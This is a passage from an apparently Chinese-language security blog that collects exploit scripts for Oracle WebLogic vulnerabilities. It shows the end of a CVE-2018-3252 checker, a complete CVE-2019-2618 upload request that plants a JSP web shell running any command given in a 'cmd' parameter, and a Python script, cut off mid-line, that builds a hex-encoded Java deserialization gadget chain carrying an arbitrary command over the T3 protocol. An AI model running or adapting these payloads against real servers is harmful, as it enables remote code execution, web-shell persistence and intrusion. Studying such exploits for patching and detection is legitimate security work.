class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;69.0.3497.100 Safari&#x2F;537.36&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        &quot;wl_request_type&quot;:&quot;data_transfer_request&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        &quot;username&quot;: username,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">        &quot;password&quot;: password,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">        &quot;deployment_request_id&quot;: &quot;108911&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        &quot;serverName&quot;: &quot;topsec&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        request &#x3D; requests.get(target)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        if request.status_code &#x3D;&#x3D; 404:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">            exit(&quot;&#123;&#125; - 404 not found&quot;.format(target))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">            print &quot;\n[*] Start detecting vulnerabilities...\n&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">            results &#x3D; requests.post(target, data&#x3D;payload_module(), headers&#x3D;header_dict).text</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">            print results</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">            c &#x3D; re.findall(r&#39;to (.+?)&quot;&#39;,results)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">            if len(c):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">                if c[0] &#x3D;&#x3D; &quot;weblogic.deploy.service.DataTransferRequest&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">                    print &quot;[+] &#123;&#125; - exists CVE-2018-3252&quot;.format(target)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">            else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">                print &quot;[-] &#123;&#125; - don&#39;t exists CVE-2018-3252&quot;.format(target)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">    except requests.ConnectionError:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">        exit(&quot;[-] Cannot connect url: &#123;&#125;&quot;.format(target))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    if len(sys.argv) &lt; 2:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">        print &quot;\n\tWebLogic DeploymentService 反序列化漏洞检测工具&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">        print &quot;\t\t\tCVEID: CVE-2018-3252&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">        print &quot;\nUsage: python CVE-2018-3252 http:&#x2F;&#x2F;localhost:7001 username password&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">        exit(-1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">        target &#x3D; sys.argv[1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">        username &#x3D; sys.argv[2]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">        password &#x3D; sys.argv[3]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">        send_request(target,username,password)</span></pre></td></tr></table></figure><h1 id="Weblogic-任意文件上传漏洞-需要账户密码-（cve-2019-2618）"><a href="#Weblogic-任意文件上传漏洞-需要账户密码-（cve-2019-2618）" class="headerlink" title="Weblogic 任意文件上传漏洞 (需要账户密码)（cve-2019-2618）"></a>Weblogic 任意文件上传漏洞 (需要账户密码)（cve-2019-2618）</h1><h2 id="veriosn"><a href="#veriosn" class="headerlink" title="veriosn"></a>veriosn</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">10.3.6.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">12.1.3.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">12.2.1.3</span></pre></td></tr></table></figure><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><p>知道账号密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">POST &#x2F;bea_wls_deployment_internal&#x2F;DeploymentService HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Host: 192.168.119.130:7001</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">Accept: *&#x2F;*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">User-Agent: python-requests&#x2F;2.21.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">username: weblogic</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">wl_request_type: app_upload</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">cache-control: no-cache</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">wl_upload_application_name: &#x2F;..&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">serverName: weblogic</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">password: yourpassword</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">content-type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary7MA4YWxkTrZu0gW</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">archive: true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">server_version: 10.3.6.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">wl_upload_delta: true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">Content-Length: 1081</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;shell.jsp&quot;; filename&#x3D;&quot;shell.jsp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">Content-Type: false</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">&lt;%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">%&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">Commands with JSP</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">&lt;FORM METHOD&#x3D;&quot;GET&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">&lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">&lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;FORM&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">&lt;%</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">    out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">    Process p;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">    if ( System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) !&#x3D; -1)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">        p &#x3D; Runtime.getRuntime().exec(&quot;cmd.exe &#x2F;C &quot; + request.getParameter(&quot;cmd&quot;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">    else&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">        p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">    OutputStream os &#x3D; p.getOutputStream();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">    InputStream in &#x3D; p.getInputStream();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">    DataInputStream dis &#x3D; new DataInputStream(in);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">    String disr &#x3D; dis.readLine();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">    while ( disr !&#x3D; null ) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">    out.println(disr);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">    disr &#x3D; dis.readLine();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">%&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;pre&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span></pre></td></tr></table></figure><h1 id="Weblogic-IIOP-反序列化漏洞检测脚本（cve-2020-2551）"><a href="#Weblogic-IIOP-反序列化漏洞检测脚本（cve-2020-2551）" class="headerlink" title="Weblogic IIOP 反序列化漏洞检测脚本（cve-2020-2551）"></a>Weblogic IIOP 反序列化漏洞检测脚本（cve-2020-2551）</h1><h2 id="version-5"><a href="#version-5" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">10.3.6.0.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">12.1.3.0.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">12.2.1.3.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">12.2.1.4.0</span></pre></td></tr></table></figure><h2 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># from:https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import socket</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import time</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">import ssl</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">import binascii</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">import urlparse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">import argparse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">globalProxies &#x3D; &#123;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">header &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    &#39;User-Agent&#39;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">def parseUrl(url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    parsed &#x3D; urlparse.urlparse(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    proto &#x3D; parsed.scheme</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    netloc &#x3D; parsed.netloc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    ip &#x3D; netloc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    if proto &#x3D;&#x3D; &#39;http&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; 80</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; 443</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    if (&#39;:&#39; in netloc):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">        ip &#x3D; netloc.split(&#39;:&#39;)[0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; netloc.split(&#39;:&#39;)[1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">    uri &#x3D; parsed.path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">    return (proto, ip, port, uri)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">def CVE_2020_2555(cmd):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">    payload_start &#x3D; &#39;aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000004374002079736f73657269616c2e7061796c6f6164732e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400096765744f626a6563747371007e000b0000000171007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a7873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000047372002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4964656e74697479457874726163746f72936ee080c7259c4b0200007871007e0022000000007372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e002200000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65707400096765744d6574686f647371007e0028000000007571007e002b000000027070740006696e766f6b657371007e0028000000007571007e002b0000000174&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    payload_lenhex &#x3D; &#39;&#123;:04x&#125;&#39;.format(len(cmd))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">    payload_cmdhex &#x3D; binascii.b2a_hex(cmd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">    payload_end &#x3D; &#39;7400046578656370767200116a6176612e6c616e672e52756e74696d650000000000000000000000787070&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; payload_start + payload_lenhex + payload_cmdhex + payload_end</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">    return payload</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">class payloadtest(object):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">    def __init__(self):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">        self.vuln &#x3D; &#39;cve_2020_2555&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    def t3handshake(self,sock,server_addr):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">        sock.connect(server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">        sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">        time.sleep(1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">        data &#x3D; sock.recv(1024)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">        #print data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">        #print &#39;handshake successful&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">    def buildT3RequestObject(self,sock,port):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">        data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">        data2 &#x3D; 